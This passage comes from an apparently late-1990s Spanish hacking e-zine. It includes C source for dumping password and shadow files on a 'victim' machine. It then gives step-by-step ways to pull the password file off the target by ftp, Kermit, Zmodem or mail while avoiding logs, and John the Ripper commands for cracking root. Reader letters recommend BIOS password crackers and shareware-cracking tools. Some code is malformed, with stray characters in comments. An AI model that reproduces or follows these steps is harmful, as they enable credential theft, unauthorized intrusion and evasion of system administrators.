pwget, grget \- get password and group information
.SH SYNOPSIS
.B pwget
.RB [ " \-n" " name"
.RB | " \-u" " uid " ]
.PP
.B grget
.RB [ " \-n" " name"
.RB | " \-g" " gid " ]
.br
.SH DESCRIPTION
.I Pwget\^
and
.I grget\^
are used to access the information found in
.B /etc/passwd
and
.BR /etc/group .
These routines provide a common access method
whether using the Yellow Page network database or not.
The output of these routines is sent to standard output.
With no options,
.I pwget
and
.I grget
output all of the data found using
.IR getpwent( LIBC )
and
.IR getgrent( LIBC )
respectively.
When options are given, only specified entries are searched for.
.PP
The options for
.I pwget
are:
.RS
.TP .8i
.BI \-n " name"
Output the first entry that matches using
.BI getpwnam( name ).
.TP
.BI \-u " uid"
Output the first entry that matches using
.BI getpwuid( uid ).
.RE
.PP
The options for
.I grget
are:
.RS
.TP .8i
.BI \-n " name"
Output the first entry that matches using
.BI getgrnam( name ).
.TP
.BI \-g " gid"
Output the first entry that matches using
.BI getgrgid( gid ).
.RE
.SH RETURN VALUE
These routines return 0 upon success, 1 when
a specific search fails and 2 upon error.
.SH WARNINGS
If the Yellow Page network database is in use and the
YP client daemon,
.IR ypbind (ADMIN),
is not connected to a YP server daemon,
.IR ypserv (ADMIN),
then these utilities will wait until such a connection is
established.  These routines can be terminated in this
condition by sending a SIGINT signal to the process (see
.IR kill (UTIL)).
.SH AUTHOR
Pwget and grget were developed by Hewlett-Packard Company.
.SH FILES
.TS
l l.
/etc/group	Local group data file
/etc/passwd	Local password data file
.TE
.SH SEE ALSO
getgrent(LIBC), getpwent(LIBC), group(FILE), passwd(FILE).
@EOF

chmod 644 pwget.1

echo x - pwget.c
cat >pwget.c <<'@EOF'
#include <stdio.h>
#include <grp.h>
#include <pwd.h>
#ifdef SYSV
#include <string.h>
#else /* not SYSV but BSD */
#include <strings.h>
#endif /* SYSV / BSD */

int atoi(), getopt();
char *arg0;

#define GRGET	1
#define PWGET	2

int mode;                      /* Mode of operation, either GRGET or PWGET. */

main(argc, argv)
int argc;
char **argv;
{
    int printgr(), printpw();
    int c;
    extern char *optarg;
    extern int optind;
    struct group *grp;
    struct passwd *pwd;
    int anyflag = 0,
	gflag = 0,
	nflag = 0,
	uflag = 0;
    int gid, uid;
    char *name, *opts;

    mode = 0;

#ifdef SYSV
    if ((arg0 = strrchr(argv[0], '/')) == NULL)
#else /* not SYSV but BSD */
    if ((arg0 = rindex(argv[0], '/')) == NULL)
#endif /* SYSV / BSD */
	arg0 = argv[0];
    else
	arg0++;			/* Start after the '/' */

    if (strcmp(arg0, "grget") == 0)
	mode = GRGET;
    else if (strcmp(arg0, "pwget") == 0)
	mode = PWGET;
    else
	usage();

    switch(mode)
    {
case GRGET:
	setgrent();
	opts = "g:n:";
	break;
case PWGET:
	setpwent();
	opts = "u:n:";
	break;
    }

    while ((c = getopt(argc, argv, opts)) != EOF)
    {
	switch (c)
	{
    case 'g':
	    if (anyflag != 0)
		usage();

	    gflag++;
	    anyflag++;
	    gid = atoi(optarg);
	    break;
    case 'n':
	    if (anyflag != 0)
		usage();

	    nflag++;
	    anyflag++;
	    name = optarg;
	    break;
    case 'u':
	    if (anyflag != 0)
		usage();

	    uflag++;
	    anyflag++;
	    uid = atoi(optarg);
	    break;
    case '?':
	    usage();
	    break;
	}
    }

    if (argv[optind] != NULL)
	usage();

    if (gflag)
    {
	if ((grp = getgrgid(gid)) != NULL)
	    printgr(grp);
	else
	    exit(1);
    }
    else if (nflag)
    {
	if (mode == GRGET)
	{
	    if ((grp = getgrnam(name)) != NULL)
		printgr(grp);
	    else
		exit(1);
	}
	else if (mode == PWGET)
	{
	    if ((pwd = getpwnam(name)) != NULL)
		printpw(pwd);
	    else
		exit(1);
	}
    }
    else if (uflag)
    {
	if ((pwd = getpwuid(uid)) != NULL)
	    printpw(pwd);
	else
	    exit(1);
    }
    else
    {
	if (mode == GRGET)
	{
	    while ((grp = getgrent()) != NULL)
		printgr(grp);
	}
	else if (mode == PWGET)
	{
	    while ((pwd = getpwent()) != NULL)
		printpw(pwd);
	}
    }

    switch(mode)
    {
case GRGET:
	endgrent();
	break;
case PWGET:
	endpwent();
	break;
    }

    exit(0);
}


usage()
{
    switch(mode)
    {
case GRGET:
	fprintf(stderr, "usage: %s [ -g gid | -n name ]\n", arg0);
	break;
case PWGET:
	fprintf(stderr, "usage: %s [ -n name | -u uid ]\n", arg0);
	break;
default:
	fprintf(stderr, "Call as either grget or pwget\n");
	break;
    }

    exit(2);
}


printgr(g)
struct group *g;
{
    char **chr;
    int comma;

    if (g != NULL)
    {
	printf("%s:%s:%d:", g->gr_name, g->gr_passwd, g->gr_gid);

	/* prints "grp1,grp2,grp3, ... ,grpn" */
	for (comma = 0, chr = g->gr_mem; *chr != NULL; chr++)
	    printf("%s%s", ((comma==0)?comma++,"":","), *chr);

	printf("\n");
    }
}


printpw(p)
struct passwd *p;
{
    if (p != NULL)
    {
	printf("%s:%s", p->pw_name, p->pw_passwd);

#ifdef SYSV
	if (strcmp(p->pw_age, "") != 0)
	    printf(",%s", p->pw_age);
#endif /* SYSV */

	printf(":%d:%d:%s:%s:%s\n", p->pw_uid, p->pw_gid,
		p->pw_gecos, p->pw_dir, p->pw_shell);
    }
}

@EOF

chmod 666 pwget.c

exit 0

------------ FIN -------------------------------------------------------------

        Una vez lo teneis en la maquina objetivo, lo compilais con "cc -o
  pwget pwget.c", y ejecutarlo ("./pwget"), con lo que obtendreis por pantalla
  la lista de passwords. Si quereis la lista en un fichero, solo teneis que
  redireccionar la salida de la pantalla a un fichero:

  $ ./pwget > fichero

        Ahora adjunto otro programita que siempre es bueno tenerlo a mano por
  si el pwget da alguna pega o algo y que sirve para obtener los password
  shadow es el siguiente.

        Su uso es gcc shadow.c -o shadow o cc shadow.c -o shadow y luego 
  ./shadowpw >> password. Asi obtenendremos el fichero de passwd en el
  fichero password.

------------ Codigo Fuente ---------------------------------------------------

/*  This source will/should print out SHADOWPW passwd files.   */
 
 struct  SHADOWPW {				 /* see getpwent(3) */
	  char *pw_name;
	  char *pw_passwd;
	  int  pw_uid;
	  int  pw_gid;
	  int  pw_quota;
	  char *pw_comment;
	  char *pw_gecos;
	  char *pw_dir;
	  char *pw_shell;
 };
 struct passwd *getpwent(), *getpwuid(), *getpwnam();
 
 #ifdef   elxsis?
 
 /* Name of the shadow password file. Contains password and aging info */
 
 #define  SHADOWPW "/etc/shadowpw"
 #define  SHADOWPW_PAG "/etc/shadowpw.pag"
 #define  SHADOWPW_DIR "/etc/shadowpw.dir"
 /*
  *  Shadow password file pwd->pw_gecos field contains:
  *
  *  <type>,<period>,<last_time>,<old_time>,<old_password>
  *
  *  <type>	 = Type of password criteria to enforce (type int).
  *		BSD_CRIT (0), normal BSD.
  *		STR_CRIT (1), strong passwords.
  *  <period>  = Password aging period (type long).
  *		0, no aging.
  *		else, number of seconds in aging period.
  *  <last_time>	 = Time (seconds from epoch) of the last password
  *		change (type long).
  *		0, never changed.n
  *  <old_time>	 = Time (seconds from epoch) that the current password
  *		was made the <old_password> (type long).
  *		0, never changed.ewromsinm
  *  <old_password> = Password (encrypted) saved for an aging <period> to
  *		prevent reuse during that period (type char [20]).
  *		"*******", no <old_password>.
  */
 
 /* number of tries to change an aged password */
 
 #define  CHANGE_TRIES 3
 
 /* program to execute to change passwords */
 
 #define  PASSWD_PROG "/bin/passwd"
 
 /* Name of the password aging exempt user names and max number of entires 
*/
 
 #define  EXEMPTPW "/etc/exemptpw"
 #define MAX_EXEMPT 100
 
 /* Password criteria to enforce */
 
 #define BSD_CRIT 0	/* Normal BSD password criteria */
 #define STR_CRIT 1	 /* Strong password criteria */
 #define MAX_CRIT 1
 #endif   elxsi
 #define NULL 0
 main()
 {
	struct passwd *p;
	int i;
	for (;1;) {;
	  p=getpwent();
	  if (p==NULL) return;
	  printpw(p);
	}
 }
 
 printpw(a)
 struct SHADOWPW *a;
 {
	printf("%s:%s:%d:%d:%s:%s:%s\n",
	   a->pw_name,a->pw_passwd,a->pw_uid,a->pw_gid,
	   a->pw_gecos,a->pw_dir,a->pw_shell);
 }
 
 /* SunOS 5.0		/etc/shadow */
 /* SunOS4.1+c2     /etc/security/passwd.adjunct */

------------ FIN -------------------------------------------------------------

        Ademas existe un programa llamado YPX que sirve para extraer estos
  mapas (incluido el fichero passwd, donde estan incluidos todos las passwords
  de los usuarios) de un servidor de NIS aunque la maquina en la que estemos
  no sea una maquina cliente. Para conseguirlo buscalo en la red en cualquier
  buscador o posiblemente este en el web de donde te bajes este texto :o). Hay
  otros programas de ese estilo como ypsnarf, etc.

  Su uso es muy sencillo ya que solo tienes que hacer:

  ypx -m passwd nombre_dominio_nis
 
        Ademas, tened en cuenta las importantes ventajas que tiene el tener
  una cuenta en un sistema con nis.. creo que no hace falta que os lo
  explique tras el rollo que ya he contado no?.. si alguno no lo tiene claro
  que se relea el texto jeje.

  6.3.- DISTINTOS METODOS PARA BAJAROS EL FICHERO DE PASSWD UNA VEZ LO TIENES
        BAJO CONTROL

        Una vez tenemos el fichero de passwd en un archivo mas o menos bajo 
  nuestro control, es decir que ya hemos pillado el shadow o tenemos acceso 
  directamente al passwd, hemos de bajar esa informacion a nuestra maquina.

  Hay varios sistemas:

        1.- Usar el ftp, corriendo el ftp en la maquina delante de la que tu
  estas sentado y usar el get para pillar el fichero de passwd. Este sera el
  metodo usual pero en algunos casos esto no sera posible debido a algun
  metodo de seguridad. Una variante de esto es configurar en tu maquina el
  ftp y usar el ftp desde la maquina victima y hacer un put (para subir el
  fichero) a tu maquina desde la maquina victima. Tambien teneis que tener en
  cuenta que el ftp tiene un fichero de logs adicional por lo que tendreis
  que tenerlo en cuenta. Un consejo para este caso puede ser hacer un cat
  passwd > cualquiera y luego bajar el fichero "cualquiera" y asi en los logs
  no queda registrado que os habeis bajado el fichero passwd.

        2.- Si el fichero de passwd no es muy grande, podemos abrir una
  ventana en nuestra maquina local y usar el copiar y pegar entre la ventana
  que tienes en la maquina victima y la ventana que tenemos en nuestra
  maquina. Es un poco cutre pero funciona :o). Por si alguien no lo sabe, en
  linux se copia con el boton izquierdo del raton y se pega con el central o
  pulsando los dos (izquierdo y derecho) a la vez dependiendo de la
  configuracion. Este metodo es cutre pero no da tanto el cante ya que en los
  logs solo aparece un cat y no aparece que te has bajado el /etc/passwd por
  ftp­!

        3.- Usar el Kermit

        Para bajar el fichero via Kermit o Zmodem necesitareis que vuestro
  programa de telnet soporte esos protocolos y que la maquina Unix en la que
  estais tambien los soporte (o sea, tenga los programas instalados). El
  programa de Kermit suele estar en casi todos los sitios:

  $ kermit
  kermit> set file type ascii (o "text", segun las maquinas)
  kermit> set send pack 1000
  kermit> set rec pack 1000
  kermit> set file type 2 (o 3, como querais)
  kermit> send fichero

  ... Download->Kermit

  CTRL+C

  kermit> quit
  $

  4.- Usar el ZModem/Ymodem/Xmodem.

  Podreis usar este sistema en caso de tenerlo instalado:

  $ sz fichero

  ... Download->ZModem

  $

        5.- Usar el mail aunque solo se debe hacer si la cuenta esta
  restringida al mail o teneis algun problema extra¤o se puede usar como
  ultimo recurso maileando el passwd desde la maquina victima a una cuenta de
  correo tuya... tiene la ventaja de que no es nada sospechoso ya que es
  usual que la gente use el mail :)... es bastante menos sospechoso ke el ftp
  :). Esto tambien suele quedar en algun fichero de logs.

        Como veis, estos metodos hay algunos muy chapuceros, pero cuando estas
  en una maquina y estas un poco desesperado se hace lo que haga falta jeje.

  6.4.- COMO SE CRACKEAN

        Una vez obtenido el fichero passwd y teniendolo en nuestra maquina,
  ahora se ha de comentar como se pueden sacar los password y los login.

        Como hemos visto, no podemos descifrar un password, pero si que
  podemos cifrar palabras con todos los salt posibles y compararlas con la
  que ya tenemos cifrada. El tema es que palabras usamos para encriptarlas y
  comparar... pues bien se pueden hacer varias cosas, usar listas de palabras
  ya hechas o haceros vosotros una. A estas listas de palabras son lo que se
  denominan los famosos diccionarios.

        Si optas por pillar diccionarios ya hechos.. hay sites que contienen
  muchas wordlists (diccionarios) en casi cualquier idioma que os podais
  imaginar. Los sites mas conocidos para estos fines son:

  ftp://sun.rediris.es/mirror/sable/wordlists/
  http://sunshine.sunshine.ro/FUN/Word_lists/
  ftp://ftp.warwick.ac.uk/pub/cud/
  ftp://sable.ox.ac.uk/pub/wordlists/

        Si prefieres hacerte uno... (es lo que os aconsejo) simplemente te
  pones delante del teclado y pones todas las palabras que se te ocurran. El
  problema de esto es que el diccionario esta restringido a tus conocimientos
  o aficiones.. por ejemplo, si no te gusta el futbol tienes un problema ya
  que mucha gente pone como password nombres de futbolistas, nombre del novio,
  de la novia, insultos, libros, su apellido, etc. Por ejemplo en el mio he
  puesto las plantillas de los equipos de futbol mas importantes, lista de
  ciudades, listas de apellidos y nombres ,etc. Ademas tened en cuenta que si
  os haceis un diccionario vosotros, solo os servira para sites espa¤oles ya
  que dificilmente sacareis algo en una maquina de zambia :o)

        Otra cosa es que muchas veces coincide el login con el password pero
  si usais el john the ripper, esto lo saca el con la opcion -single.

        Ademas, os podeis ayudar de algun programa para extraer todas las
  palabras de un fichero o utilidades que hay en la red para modificar listas
  de palabras.. pero eso es otro cantar.

  6.5.- Que crackeador de password usar.

        Ahora que ya teneis la lista de passwords y unas cuantas listas de
  palabras falta un programa que encripte las palabras y las compare con los
  passwords encriptados del fichero de passwords. Para ello hay muchos
  programas que podeis usar. Ahora comentare brevemente las caracteristicas
  de los programas (y sus nombres, para que los podais buscar por la red),
  pero antes quiero dar algunos truquillos para que consigais passwords en
  menos tiempo.

        ? Elimina del fichero de passwords todas las lineas cuyo password sea 
  invalido ("*", "*NOPASSWORD*", etc) 

        ? Ordenad las lineas del fichero de password por los dos primeros 
  caracteres del password encriptado. Algunos de los programas que comento ya
  hacen esto al cargar el fichero de password, pero algunos no lo hacen. Con
  estos dos pasos os podeis ahorrar bastante tiempo si usais estos petadores. 

        ? Aquellos usuarios que tienen el campo de password vacio 
  (user1::101:1:Manolito:/usr/user1:/bin/sh) no tienen password, asi que 
  son una cuenta que podeis eliminar del fichero, ya que no os hace falta 
  petar el password para entrar. 

  Petadores:

        ? Cracker Jack 1.4 (JACK14*.*, CJACK. Esta en practicamente cualquier 
  site de internet dedicado al hacking. Funciona para DOS y para OS/2, y 
  es bastante rapido. Incluye en el mismo paquete varias utilidades para 
  tratar listas de palabras. 

        ? Brute 2.00 (BRUTE*.*) Otro petador bastante popular pese a su
  lentitud. Creo que existe otra version mas rapida, pero usa un algoritmo de 
  encriptacion que no es del todo correcto (aunque es mas rapido), y no pilla
  todos los passwords que debiera. No he podido localizar ninguna copia de
  esa version asi que no la he podido probar. Funciona para DOS.

        ? StarCrack 0.64á (STARCRAK*.*) Este es un petador con multitud de 
  opciones, que permite manipular palabras mientras se prueban. Es mas rapido
  que el Cracker Jack, funciona para DOS y es muy completo. Es bastante nuevo,
  y ademas es una Beta, o sea que supongo que pronto saldra alguna version
  mejorada... :-? Es bastante completo y permite hacer de todo ? Esta es la
  homepage del StarCrack: http://www.chez.com/thes/starcrak.html 

        ? Hades 1.00a (HADES*.*) Otro petador para DOS. Este hace las pruebas 
  de una forma distinta al resto de petadores. En vez de encriptar una 
  palabra y comparar con los passwords de todos los usuarios, prueba de 
  encriptar todas las palabras y compara cada palabra con el password de 
  un usuario. Una vez ha acabado con un usuario, prueba lo mismo con otro.
  Debido a esta forma de actuar, realiza mucha entrada/salida de disco, lo
  cual ralentiza el proceso. Sus prestaciones mejoran notablemente si
  ordenamos el fichero de passwords por el campo password encriptado, ya que
  asi prueba varios usuarios a la vez. Tambien se puede mejorar su rendimiento
  teniendo todas las listas (palabras y passwords) en un disco virtual en
  memoria.

        ? Guess 2.1 (GUESS*.*) Petador para DOS, extremadamente lento. Tiene 
  problemas de memoria si se intenta usar con ficheros de passwords de 
  mas de 1000 lineas. 

        ? PCUPC 2.01 (PCUPC*.*) Otro petador para DOS. Este tiene problemas 
  de memoria si se intenta usar con ficheros de passwords de mas de 
  600/700 lineas.

        ? Killer Cracker 9.5 (DJKC95*.*, KC*.*) Al igual que el Guess, es un 
  petador para DOS bastante lento y que da problemas si se usa con 
  ficheros de passwords de mas de 1000 lineas.

        ? Xit 2.0 (XIT20*.*) Petador para DOS. Es lo mas lento que me he 
  encontrado. Como su nombre indica, es una shit! :-) 

        ? HellFire Cracker 1.3 (HC130*.*) Petador para DOS. Necesita 386 con 
  coprocesador para funcionar, pero por algun extra¤o motivo se cuelga en mi
  pentium y en mi 486, asi que no os puedo decir que tal este. Quizas si
  teneis un 386 lo podais usar con exito. El programa incluye un emulador de
  387 por si no teneis coprocesador. De todas formas, es un programa muy
  antiguo que seguramente no sera muy rapido. 

        ? John the ripper 1.4 (UCFJOHN3*.*) Petador para DOS/Win32/Linux y
  cualquier otra cosa, ya que viene con las fuentes. Funciona de una forma
  muy similar al Cracker Jack pero incluye mas opciones y es bastante mas
  rapido. No tiene tantas opciones como el Star Crack, pero es bastante mas
  rapido. Ademas permite un monton de opciones para tratar las listas de
  palabras que usais... ? Esta es la homepage del John the 
  Ripper: http://www.false.com/security/john/ 

        Aqui teneis una comparativa de estos petadores, en la misma maquina y
  con los mismos ficheros de passwords y de palabras. Algunos de ellos
  tardaban demasiado, y aborte el proceso de petar passwords. En estos casos,
  calcule el tiempo estimado que tardarian en acabar en funcion del tiempo
  que llevaban (1 hora) y las palabras que habian provado hasta el momento.
  Estos son los resultados, ordenados por velocidad:

  PRIVATE Cracker
  Tiempo
  Comparacion
  es
  por Segundo
  Observaciones
  John the ripper 1.4
  6'15''
  26667c/s
  .
  John the ripper 1.31
  6'30''
  25641c/s
  .
  John the ripper 1.0
  8'05''
  20619c/s
  .
  Star Crack 0.64á
  9'15''
  18018c/s
  .
  Star Crack 0.51á
  11'25''
  14599c/s
  .
  Cracker Jack 1.4
  13'33''
  12300c/s
  .
  Cracker Jack 1.3 386
  14'55''
  11173c/s
  .
  Cracker Jack 1.3 8086
  22'22''
  7452c/s
  .
  Hades 1.00a
  47'05''
  3540c/s
  .
  Brute 2.00
  (est)59'54''
  2782c/s
  .
  PCUPC 2.01
  (est)135'37''
  1229c/s
  Solo soporta ficheros de passwords
  de menos de 500 lineas.
  Guess 2.1
  (est)141'58''
  1174c/s
  Solo soporta ficheros de passwords 
  de menos
  de 1000 lineas.
  Killer Cracker 9.5
  (est)151'12''
  1105c/s
  Solo soporta ficheros de passwords
  de menos de 1000 lineas.
  Xit 2.0
  (est)195'37''
  852c/s
  .
  Hellfire Cracker 1.3
  infinito
  0c/s
  Se colgo y no pudo ser probado.

        Este test fue realizado en un Pentium 133, con 16 Mb de RAM, con los
  datos en el disco duro, con una cache de lectura de 2 Mb y sin hacer ningun 
  preprocesado en el fichero de passwords ni en el de palabras. El fichero de 
  palabras contenia 10000 palabras y el de passwords 1000 passwords. Tenian 
  que encontrar 554 passwords.

        Algunos de ellos no los deje acabar ya que tardaban demasiado y estime
  el tiempo en funcion de lo que habian crackeado hasta el momento de
  pararlos, por lo tanto no se si hubieran encontrado todos los passwords.
  Solo los he incluido en la comparativa por si alguno de vosotros los usa,
  para que vea que hay cosas mejores.

        Como se puede ver, el John the ripper encripta casi el doble de
  passwords por segundo que el Cracker Jack. He de reconocer que el fichero
  con el que hize la prueba parece ser especialmente adecuado para el John the
  ripper, ya que 20000c/s no se consiguen habitualmente. De todas formas, la
  comparativa es significativa de la velocidad a la que se petan passwords con
  cada uno de los programas.

        Una cosa que me gustaria puntualizar es que aunque el password del
  root se puede sacar con este metodo de fuerza bruta, no es demasiado
  aconsejable y solo se debe usar para casos in extremis. Esto es asi porque
  si el root tiene algo de idea de esto, tendra un passwd un poco raro y no
  lo podreis sacar facilmente a no ser que pongais el john en modo incremental
  (y esto es una locura tal como se comentara mas adelante).

        Otra historia es si teneis a mano una maquina de donde podais colgar
  el proceso con lo que lo podeis colgar de alli y que trabaje el (el problema
  es que consume mucha CPU por lo que como el root vea los procesos os
  pillaran, os lo mataran y encima estara bajo aviso) por lo que a no ser que
  tengais acceso a una maquina que sepais que el root no esta muy al loro, no
  useis este metodo, pero buscando y con un poco de suerte al final
  encontrareis una maquina con estas caracteristicas.

        Para usar el john the ripper suponiendo que el fichero de passwords
  se llama passwd se haria:

  John -single passwd ------ Asi saca los passwd mas sencillos
  John -wordfile:nombrediccionario -rules passwd -:Para emplear un diccionario
  John -wordfile:nombrediccionario -rules -users:0 passwd -:Para emplear un 
  diccionario para sacar el root.

        Este programa ofrece muchisimas posibilidades por lo que para mas 
  informacion leerse los docs que se adjuntan con el propio john the ripper.

  Nota De - J.J.F. / HACKERS TEAM -: La segunda parte de este articulo en el
  siquiente numero.

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                           ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                          <  EL LECTOR OPINA  >
                           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        Aqui con nuestra nueva seccion responderemos a las preguntas que nos
  que nos enviais por mail. Asi todos pueden ver la respuesta. Esperemos que
  se de vuestro agrado y que esta seccion se convierta en algo interesante
  para todos.

        Esperamos que tambien que seais vosotros (los propios lectores) que
  nos envies mail's contestando a las preguntas de otros lectores, asi
  consiguiremos una seccion muy activa y prospera para todos ;-)

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  From avillalo@xxxxxxxxxxxxxx Fri Feb 20 11:50:54 1998
  To: conde_vampiro@hotmail.com
  Subject: Clave Maestra

  Hola estimado conde Vanmpiro por medio de este imail 
  quisiera preguntarte si sabes o as visto en alguna 
  parte de la RED, la combinacion de teclas 
  conocidas popularmente como: Clave Maestra Unica 
  (Version GA.04.06 de ROM BIOS Pc's HP Vectra 486).

  Te agradecere cualquier comentario al respecto

  Nota : Hewlett Packard niega la existencia de este 
  tipo de clave maestra, sin embargo ya comprobe
  su existencia y me lo mostraron pero no me 
  quisieron dar la combinacion.

  SALUDOS

  avillalo@xxxxxxxxxxxxxx

  <------>

  [ Pues lo primero mi nick se escribe Vampiro :)
    Supongo lo que preguntas es como acceder a la BIOS, pues facil. Cuando
    el ordenador este cargando la memoria (justo al principio de encenderlo)
    pulsamos "ESC" o "SUPR" (depende el ordenador) y accederas al menu de la
    BIOS. Si esta tuviese algun password que no conoces le metes un
    crackeador de BIOS (disponibles en nuestro web) y ya esta.
    Como advertencia te dire que si manipulas la BIOS y estropeas algo, la
    garantia no sera valida y tendras que pagar por repararlo. ]

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  Date: Tue, 24 Feb 1998 11:42:17 MDT
  From: "frank" <crazy@xxxxxxxxxxxxxx>
  To: conde_vampiro@usa.net
  Subject: Hola

  Hola otra vez, conde te aseguro no traigo ajos ni nada parecido, bueno
  he visto tu rinkon de wes y nostamal, yo en mi modesta posicion de 
  observador tengo que decir que !!!!ME GUSTARIA TENER UNA 
  PAGINAAAAA!!!!!, espero que cuando pueda hacerla (te digo quel diseqo 
  yasta hecho) mayudes con temas de ... (tu ya mentiendes), lo que no se 
  es de donde podria colgar una pagina asi, enviame un mailcito para ver 
  donde podria, toy aki: fperet@xxxxxxxxxxxxxx 

  bueno espero que me des alguna respuesta, y si no pues que lo pases 
  guay. 

  HASTA LA VISTA, BABY.... 

  <------>

  [ Pues thx por tus cumplidos pero nosotros no nos dedicamos a buscar
    sitios para albergar web's ademas tampoco es dificil encontrar estos
    servidores pero esta vez hare una excepcion pero no os acostumbreis !!

    - www.geocities.com
    - www.angelfire.com
    - www.islatortuga.com
    - www.netaddress.usa.net
    - www.bayside.net ]

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  Date: Sun, 22 Feb 1998 17:13:52 MDT
  From: Miguel Angel Ramirez <vermar1@xxxxxxxxxxxxxx>
  To: mac_crack@usa.net Cc: conde_vampiro@usa.net
  Subject: Pidiendo informacion 

  Hola Amigos!
  Les escribo de Jalisco y realmente creo que su pagina 
  es muy buena, pero creo que eso ya se los han dicho, 
  asi que pasare al motivo de mi correo. 
  Lo que pasa es que he bajado los archivos de Nonag2 y 
  Nagbuster, lo que se encargan de anular los codigos 
  de proteccion del shareware, pero resulta que no 
  tengo idea de como hacerlos funcionar, para que 
  desactiven esos codigos. Por ejemplo, con el nonag2, 
  trato de correr el ejecutable y me dice que necesito 
  especificar un directorio,pero no encuentro manera de 
  hacer eso. Por lo mismo quisiera ver si es posible 
  que me escriban un correo explicandome como funcionan 
  estos programas. De ante mano les agradezco su 
  informacion. Hasta la vista. 

  === 

  Puede escribir una copia de su correo tambien a
  vermar@xxxxxxxxxxxxxx

  <------>

  [ Pues facil ;-)

   - el Nonag2 tienes que ejecuatarlo de la siguiente manera :

   c:\>nonag2 <fichero_que_quieras_modificar> 

   - Y el Nag-Buster, solo tienes que ejecutar el :

   c:\>buster

    y accederas a un menu, y las 2 primeras opciones son los listados los
    cuales el Nag-Buster les quita la proteccion.

    Bueno pues espero que tus dudas esten aclaradas. La verdad es que muchas
    veces estos programas no rulan bien, ademas solo suelen funcionar con
    programas antiguos, por lo que es recomendable que busces algun
    crack especifico para el programa que quieras 'alterar'. ]

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  Subject: hpola
  To: jjf_team@hotmail.com
  Date: Tue, 24 Feb 1998 10:30:11 MET
  From: 444525@xxxxxxxxxxxxxx 

  BUenas,hackers..
  Os escribo pa felicitarospor vuestra revista..es bastante buenecilla.. y pa
  deciros ke sigais kon ella adelante,ke lo normal es ir kada vez a mas..y ke
  si los primero snumeros son tan buenos entonces.. ;)
  Bueno,tan bienm os escribo pa haceros una preguntilla...a ver,pa subir un
  archivo a una kuenta ke tengo..eske por ftp no puedo entrar...y otra kosa...
  hotmail es tan seguro komo parece?
  Gracias.tios.

  red rUsH

  <------>

  [ Thx por la felicitacion e intentamos mejorar cada numero, como te habras
    dado cuenta en este numero ;-)
    Por ftp no te deja ?? pues has intentado usar el kermit, por ejemplo ?
    si tampoco no rula, pues envialo por mail como un "adjunto" a tu cuenta
    y listos.
    Lo de Hotmail, pues por lo visto ha sido adquirido por Microsoft pero
    segun la compa¤ia todo seguira igual. Aqui hay 2 puntos de vista, por una
    parte puede que no sea seguro pero al igual Microsoft tampoco puede
    meterse en estos lios si vigila el Hotmail, ya que esta metido en varios
    pleitos, o sea que tu decides.
    Nosotros hemos cambiado de cuenta de mail, por varios motivos ( uno de
    ellos, es ese :). ]

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  Date: Thu, 26 Feb 1998 23:13:59 MDT
  From: "asesino" <asesino@xxxxxxxxxxxxxx> 

  Holas paseando he caido en vuestra wes , me ha parecido buena pero 
  hecho en falta que los e-zines esten en un zip comprimidos para 
  ahorrarme leerlos onlines por los cuartos del telefono , el ezine 
  toavia no me ha dao tiempo a leerlo asi que no digo na. Por lo demas 
  seguid asi que esto esta muy bien , ahh otro consejito pillad pgp pa 
  encriptar el mail asi no os leeran el correo y pones las llaves 
  publicas en la web , usad la version 263.i que genera claves rsa que 
  son mas seguras que la 5 para windows , bueno bye 
  bueno hay va mi llave publica pal que la quiera : 

  Type Bits/KeyID Date User ID
  pub 2048/44D3E411 1998/02/26 asesino <asesino@arrakis.es> 

-----BEGIN PGP PUBLIC KEY BLOCK----- 
Version: 2.6.3i 

mQENAzT1dBUAAAEIANaRs9pMeaQD8rUNMSLQ8yTvCb4N7VmNO4mOO00n/He+tzHx 
12kI4GCwR0aoQbUjj30WPzR73BINc7ebaJ5lr7bsZVtx+QfHQVJajt2WhMdvwkuU 
OO8p7G1YRkjZbr48eUg83IuRTTV67ULKPwyJfecg/biFIyJMiC4Mxq0qj8ixsPKA 
